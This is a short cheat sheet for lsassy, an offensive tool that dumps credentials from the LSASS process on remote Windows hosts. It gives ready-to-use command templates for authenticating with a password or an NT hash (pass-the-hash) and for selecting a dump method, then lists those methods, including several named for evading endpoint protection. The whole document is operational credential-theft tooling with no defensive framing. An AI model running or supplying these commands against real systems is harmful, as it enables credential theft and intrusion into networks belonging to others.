### Source
https://github.com/Hackndo/lsassy  

### Get lsas credentials from remote host
```
lsassy -d <domain> -u <user> -p <password> <rhost>
```

### Get lsas credentials from remote host using nt hash
```
lsassy -d <domain> -u <user> -H <[LM:]NT> <rhost>
```

### Dump using specific method
```
lsassy -d <domain> -u <user> -p <password> <rhost> -m <method> -vv
```

### Dumping methods
```
comsvcs
comsvcs_stealth
dllinject
dumpert
dumpertdll
edrsandblast
mirrordump
mirrordump_embedded
nanodump
ppldump
ppldump_embedded
procdump
procdump_embedded
rdrleakdiag
wer
```

